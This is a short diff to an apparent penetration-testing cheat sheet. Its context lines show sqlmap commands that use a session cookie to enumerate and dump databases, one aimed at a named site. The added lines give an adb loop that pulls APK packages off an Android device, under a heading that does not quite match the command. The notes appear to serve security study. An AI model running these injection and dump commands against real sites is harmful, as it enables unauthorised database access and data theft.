@@ -10,3 +10,11 @@ SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.
 sqlmap -u "URL" --cookie="PHPSESSID=1234" --dbs
 sqlmap -u "TARGET_URL" --cookie="SESSION_COOKIE" -D DATABASE_NAME -T TABLE_NAME --dump
 sqlmap -u http://www.moviescope.com/index.aspx --cookie="mscope=1jWydNf8wro=; ui-tabs-1=0" --dbs
+
+
+**MOBILE-download all the apk packages - apart from 3rd party APKs**
+
+adb shell pm list packages -f | sed 's/package://' | while IFS='=' read apk pkg; do
+      echo "[+] Downloading $pkg"
+      adb pull "$apk" "apks/${pkg}.apk"
+done
